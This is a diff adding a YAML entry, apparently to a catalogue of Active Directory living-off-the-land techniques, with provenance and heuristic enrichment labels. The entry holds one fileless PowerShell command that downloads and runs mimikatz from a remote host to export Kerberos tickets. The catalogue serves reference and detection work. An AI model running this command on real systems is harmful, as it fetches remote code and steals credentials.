@@ -22,3 +22,47 @@ tags:
 - active-directory
 - lolad
 - powershell (fileless)
+source_data:
+  LOLAD:
+    raw:
+      name: Extract Kerberos Ticket (Fileless)
+      command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+        -Command 'kerberos::list /export'
+      type: PowerShell (Fileless)
+    upstream_url: https://lolad-project.github.io
+    upstream_version: 6ed6a25
+    last_synced: '2026-08-28'
+enrichment:
+  capabilities:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a25
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  phases:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a25
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a25
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-08-28'
+  source_hashes:
+    LOLAD: sha256:f7e9edb498ab5351b586979fb7d1a0efd8176ed47b9d3c09932def5498a17993
